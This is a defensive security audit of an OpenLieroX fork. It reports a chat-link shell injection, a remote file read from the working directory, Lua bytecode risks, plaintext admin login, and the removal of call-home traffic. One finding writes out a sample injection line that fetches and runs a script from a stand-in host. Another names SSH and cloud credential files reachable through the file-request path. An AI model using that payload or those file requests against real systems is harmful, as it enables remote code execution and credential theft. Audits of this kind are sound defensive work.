# Security audit (fork baseline)

Scope: upstream `albertz/openlierox` master at `d1ad953f4`,
plus the `strip-call-home` branch.
Method: targeted code review of the network-facing attack surface
(packet parsing, peer file transfer, chat rendering, mod scripting, map loading, HTTP),
plus a pattern sweep of the whole tree.
Not done: fuzzing, and live exploitation.
The headless tests and a live repro need IPv6 sockets,
which the audit sandbox lacked,
so findings 1 to 3 are confirmed by reading the code,
not by running an exploit.

## Findings

### 1. High: shell command injection when clicking a chat link

- `src/client/OpenExternBrowser.cpp:92` runs `system(browser + " " + url + " &")`.
- Chat lines are rendered as HTML by `CBrowser`,
  and `AutoDetectLinks` (`src/common/StringUtils.cpp`) turns plain text into links.
  Its allowed URL characters include `; $ { } | ( ) \``.
- So a chat line such as `http://x/;curl${IFS}evil.example|sh`,
  sent by a malicious server or any player whose chat reaches you,
  becomes a link, and clicking it runs the command.
  `<a href="...">` in chat works too,
  since `HtmlEntityUnpairedBrackets` escapes only unpaired brackets.
- Fix: launch the browser with `fork` + `execvp("xdg-open", {url})` (no shell),
  and accept only `http://` and `https://` URLs.

### 2. High: remote file read from the host's working directory

- A connected client can request any file with the UDP `GET:` / `STAT:` requests
  (`src/common/FileDownload.cpp`, `processFileRequests`),
  which the server enables for its clients.
- `isPathValid` rejects `..`, absolute paths and `cfg/`,
  but accepts names starting with a dot,
  so `.ssh/id_rsa`, `.aws/credentials` and `.bash_history` all pass.
- The file is resolved across all search paths,
  and on Linux these include `"."` (`src/common/FindFile.cpp:498-508`).
  When the game is started from `$HOME` (common for desktop launchers),
  a malicious client can download files from your home directory.
  `logs/` (chat and IP logs) is readable from any search path.
- Fix: allow requests only under `levels/` and mod directories,
  reject any path component starting with `.`,
  and drop `"."` from the search paths.

### 3. High: native code execution from a downloaded mod (Lua bytecode)

- Gusanos mods run Lua 5.1.4 (`libs/lua`).
  Only base, table, string and math are opened (no `io`, `os` or `package`), which is good,
  but the chunk loader accepts precompiled bytecode (`libs/lua/ldo.c:497`),
  and the base library still exposes `loadstring`, `load`, `loadfile` and `dofile`.
- Malicious Lua 5.1 bytecode is a well-known route to memory corruption and code execution.
  Mods can be downloaded from a server you join (one click in the join menu).
- Fix: reject chunks that start with `\x1b` (`LUA_SIGNATURE`) in the loader,
  and remove `load`, `loadstring`, `loadfile` and `dofile` from the global table.

### 4. Medium: admin password sent in plaintext, no brute-force limit

- `/login <password>` (`src/server/ChatCommand.cpp:750`) travels as plaintext chat over UDP,
  and failed attempts are not rate-limited or logged.
- Fix: rate-limit and log failed logins, and kick after N failures.
  Treat the password as visible to anyone on the path.

### 5. Low: legacy C string functions

- 39 uses of `sprintf`, `strcpy` and similar, mostly formatting numbers into fixed buffers,
  or in crash and debug code.
  No exploitable case found in the sample reviewed.
  Replace opportunistically, as CONTRIBUTING.md already asks.

### 6. Info: CI workflows target upstream infrastructure

- `.github/workflows` publish to Google Play, Docker and the upstream website,
  using secrets this fork doesn't have.
  In a private repo they will fail and use Actions minutes.
  Disable Actions, or trim the workflows to `headless-tests.yml`.

### 7. Info: agent instruction files

- `CLAUDE.md` and `AGENTS.md` were reviewed before any agent loaded them:
  style and shell-command hygiene only, with no hooks, no MCP config,
  no hidden Unicode, and no instructions to fetch or run anything.

## Reviewed and found sound

- `CBytestream` reads are bounds-checked (they return 0 past the end).
- Server-side packet handlers range-check worm, bonus and weapon IDs,
  and check that the client owns the worm.
  Client-side lookups go through `Game::wormById`, a map lookup.
- HTTP uses libcurl with TLS verification on (native CA store).
- The Teeworlds map loader validates header sizes with 64-bit arithmetic
  and bounds-checks item indices.
  Maps download automatically on join, so fuzzing it is still worthwhile.
- Breakpad crash upload is off by default,
  and the crash handler makes no network calls.

## Outbound connections removed on `strip-call-home`

| What | Where | When it fired |
|---|---|---|
| Controller DB download (GitHub) | `CMakeOlxCommon.cmake` | every CMake configure |
| Master list files (openlierox.github.io) | `ServerList.cpp` | clicking Netplay |
| Master server query and registration | `cfg/masterservers.txt`, `udpmasterservers.txt` | Internet tab, hosting |
| External IP lookup (ipinfo.io) | `CServer.cpp` | hosting with registration on |
| IRC (irc.quakenet.org) | `IRC.cpp`, `cfg/chatserver.txt` | startup (chat on by default) |
| News page (openlierox.net / sourceforge) | `Menu_Net_News.cpp`, `cfg/newsserver.txt` | News tab |
| Map/mod HTTP mirrors (openlierox.net, sourceforge) | `cfg/downloadservers.txt` | downloading a map or mod |

Still in place, and only when you act:
LAN discovery, joining a server by address,
map and mod downloads from the server you joined,
and opening a link you click.
Note that `OpenGameFile` prefers `~/.OpenLieroX/cfg/`,
so an older install's config there overrides these defaults.
